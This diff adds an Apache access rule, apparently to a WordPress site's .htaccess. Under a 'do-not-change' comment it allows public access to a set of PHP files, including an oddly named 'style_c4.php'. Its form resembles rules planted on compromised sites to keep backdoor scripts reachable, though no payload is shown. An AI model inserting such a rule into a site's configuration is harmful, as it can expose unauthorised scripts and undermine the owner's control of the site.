@@ -1,0 +1,5 @@
+#---do-not-change-the-following-content---
+<FilesMatch '^(index.php|query-grid-posts.php|query-large-title-posts.php|query-medium-posts.php|query-offset-posts.php|query-small-posts.php|query-standard-posts.php|social-links-shared-background-color.php|style_c4.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
